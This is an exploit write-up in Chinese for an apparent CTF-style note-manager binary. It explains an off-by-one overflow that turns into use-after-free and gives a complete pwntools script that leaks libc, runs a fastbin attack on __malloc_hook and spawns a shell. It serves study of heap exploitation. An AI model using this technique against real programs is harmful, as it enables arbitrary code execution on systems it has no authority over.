# 漏洞利用文档

## 执行环境
基于反编译代码和调试记录分析，程序运行环境如下：
- **二进制类型**：64位ELF可执行文件，动态链接
- **安全机制**：
  - ASLR：开启（libc基址随机化）
  - NX：开启（堆栈不可执行）
  - PIE：可能未开启（全局变量地址固定，如0x202060）
  - Canary：可能未开启（未检测到栈保护）
- **依赖库**：标准libc（通过ldd确认）
- **运行需求**：Linux环境，需要标准输入输出

## 漏洞成因
### 关键结构体分析
程序使用全局变量管理状态：
- `unk_202060`：名字缓冲区（0x30字节）
- `qword_202090`：当前笔记指针
- `unk_202040`：当前笔记大小

### 漏洞类型：Off-by-One溢出 + UAF
- **根本原因**：`sub_C60`函数（更新名字）读取0x31字节到0x30字节缓冲区，导致off-by-one溢出
- **溢出位置**：第49字节覆盖相邻的`qword_202090`低字节
- **连锁效应**：
  1. 指针被恶意修改后，`delete`操作释放错误堆块
  2. 大小变量`unk_202040`未同步重置，造成UAF
  3. 通过编辑功能可实现堆溢出和任意地址写

## 漏洞利用过程
### 内存变化时间线

| 步骤 | 操作 | 关键内存变化 | 利用目的 |
|------|------|--------------|----------|
| 1 | `p.recv();payload=b'a'*0x30` | 名字缓冲区填充48字节'a' | 准备off-by-one溢出 |
| 2 | `add(0x80); add(0x10)` | 分配两个堆块：0x80和0x10 | 创建堆布局 |
| 3 | `update(b'a'*0x30+p8(0x10))` | `qword_202090`从`0x...a0a0`变为`0x...a010` | off-by-one溢出修改指针 |
| 4 | `delete()` | 释放第一个堆块到unsortedbin | 触发UAF，泄露libc |
| 5 | `add(0x10); update(b'a'*0x30+p8(0x30))` | 指针变为`0x...a030`，指向unsortedbin fd | 准备fastbin attack |
| 6 | `show(); libc_leak=...` | 读取unsortedbin fd计算libc基址 | 获取libc地址 |
| 7-8 | 多次`add`/`delete` | 塑造堆布局，创建fastbin链 | 准备任意地址分配 |
| 9-11 | `update`+`edit` | 修改fastbin fd指向`__malloc_hook-0x23` | 实现任意地址写 |
| 12-13 | `add`+`edit` | 分配到`__malloc_hook`附近，写入one_gadget | 覆盖hook函数 |
| 14 | `add(0x50)` | 触发`__malloc_hook`执行 | 获取shell |

### 堆布局演变
```
初始: [无堆块]
步骤2: [chunk1:0x80][chunk2:0x10][top]
步骤4: [free:0x80(unsortedbin)][chunk2:0x10][top]
步骤5: [alloc:0x10][free:0x70(unsortedbin)][chunk2:0x10][top]
步骤8: [多堆块] + [fastbin:0x70]
步骤12: [分配至__malloc_hook区域]
```

## Exploit
```python
from pwn import *
from pwncli import one_gadget

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
p = process('./data/sample15')
elf = ELF('./data/sample15')
libc = elf.libc
choice_words = '6.exit\n'
menu_add = 1
add_index_words = ''
add_size_words = 'Input the size\n'
add_content_words = ''
menu_del = 2
del_index_words = ''
menu_show = 3
show_index_words = ''
menu_edit = 5
edit_index_words = ''
edit_size_words = ''
edit_content_words = 'Input the note\n'
one_gadget = 0x4527a

def add(index=-1, size=-1, content=''):
    p.sendlineafter(choice_words, str(menu_add))
    if add_index_words:
        p.sendlineafter(add_index_words, str(index))
    if add_size_words:
        p.sendlineafter(add_size_words, str(size))
    if add_content_words:
        p.sendafter(add_content_words, content)

def delete(index=-1):
    p.sendlineafter(choice_words, str(menu_del))
    if del_index_words:
        p.sendlineafter(del_index_words, str(index))

def show(index=-1):
    p.sendlineafter(choice_words, str(menu_show))
    if show_index_words:
        p.sendlineafter(show_index_words, str(index))

def edit(index=-1, size=-1, content=''):
    p.sendlineafter(choice_words, str(menu_edit))
    if edit_index_words:
        p.sendlineafter(edit_index_words, str(index))
    if edit_size_words:
        p.sendlineafter(edit_size_words, str(size))
    if edit_content_words:
        p.sendafter(edit_content_words, content)

def update(content):
    p.sendlineafter(choice_words, '4')
    p.sendafter('input your name\n', content)

# Step 1: 初始名字填充，准备off-by-one溢出
p.recv()
payload = b'a'*0x30
p.send(payload)

# Step 2: 分配两个堆块，创建基础堆布局
add(size=0x80)
add(size=0x10)

# Step 3: off-by-one溢出修改笔记指针低字节
update(content=b'a'*0x30 + p8(0x10))

# Step 4: 删除笔记，触发UAF并泄露libc
delete()

# Step 5: 重新分配小堆块，再次溢出指向关键位置
add(size=0x10)
update(content=b'a'*0x30 + p8(0x30))

# Step 6: 显示笔记内容泄露libc地址
show()
libc_leak = u64(p.recv(6).ljust(8, b'\x00'))
libc.address = libc_leak - (0x3c4b20 + 0x58)  # 计算libc基址

# Step 7-8: 塑造堆布局，创建fastbin链
add(size=0x60)
add(size=0x40)
add(size=0x60)
delete()

# Step 9-10: 分配小堆块并溢出修改指针
add(size=0x10)
update(content=b'a'*0x30 + p8(0x10))

# Step 11: 编辑笔记覆盖fastbin的fd指针
edit(content=p64(libc.sym['__malloc_hook'] - 0x23))

# Step 12: 通过fastbin attack分配到__malloc_hook附近
add(size=0x60)
add(size=0x60)

# Step 13: 覆盖__malloc_hook为one_gadget
edit(content=b'a'*(0x13 - 0x8) + p64(libc.address + one_gadget) + p64(libc.sym['realloc'] + 12))

# Step 14: 触发malloc执行shell
add(size=0x50)

# Step 15: 交互模式
p.interactive()
```

### 关键注释说明
- **off-by-one溢出**：通过更新名字功能溢出1字节，精确控制笔记指针低字节
- **UAF利用**：指针重定向后删除错误堆块，造成use-after-free
- **libc泄露**：通过unsortedbin的fd指针泄露libc基址
- **fastbin attack**：伪造fd指针实现任意地址分配
- **hook覆盖**：覆盖`__malloc_hook`为one_gadget，通过realloc调整栈帧
- **触发执行**：最后malloc调用触发shellcode执行

此漏洞利用成功演示了如何通过off-by-one溢出结合堆管理漏洞实现任意代码执行。
